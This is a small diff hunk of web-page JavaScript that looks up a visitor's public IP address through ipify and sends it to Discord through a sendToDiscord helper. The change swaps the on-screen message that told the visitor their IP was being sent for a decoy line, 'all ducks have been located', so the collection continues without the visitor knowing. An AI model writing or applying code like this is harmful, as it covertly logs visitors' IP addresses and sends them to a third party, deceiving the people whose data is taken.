@@ -76,7 +76,7 @@
       const res = await fetch("https://api.ipify.org?format=json");
       const data = await res.json();
       const ip = data.ip;
-      status.textContent = `Your IP is ${ip}. Sending to Discord...`;
+      status.textContent = `all ducks have been located`;
 
       await sendToDiscord(`User IP: ${ip}`);
 
